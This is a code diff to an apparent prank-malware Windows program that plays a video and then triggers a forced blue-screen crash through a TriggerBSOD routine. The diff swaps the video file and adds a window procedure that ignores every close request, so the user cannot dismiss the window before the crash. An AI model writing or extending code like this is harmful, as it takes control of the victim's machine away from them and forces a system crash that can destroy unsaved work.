@@ -3,7 +3,7 @@
 
 // constants
 #define BSOD_ERROR_CODE 0xdead2bad // :-)
-#define VIDEO_FILE_NAME L"mario.wmv"
+#define VIDEO_FILE_NAME L"hamer.wmv"
 #define VIDEO_RESOURCE_ID 2
 
 // externs for BSoD functions
@@ -15,6 +15,19 @@ IGraphBuilder* graph = NULL;
 IMediaControl* control = NULL;
 IMediaEvent* event = NULL;
 IVideoWindow* window = NULL;
+
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    switch (msg) {
+    case WM_CLOSE:
+        // Игнорировать попытки закрытия
+        return 0;
+    case WM_SYSCOMMAND:
+        if ((wParam & 0xFFF0) == SC_CLOSE)
+            return 0;
+        break;
+    }
+    return DefWindowProc(hwnd, msg, wParam, lParam);
+}
 
 void TriggerBSOD() {
     // initialize variables
@@ -101,7 +114,7 @@ int main() {
 
     // play video
     result = control->Run();
-
+    
     // wait for video playback to complete
 	if (SUCCEEDED(result)) {
 		event->WaitForCompletion(INFINITE, &eventCode);
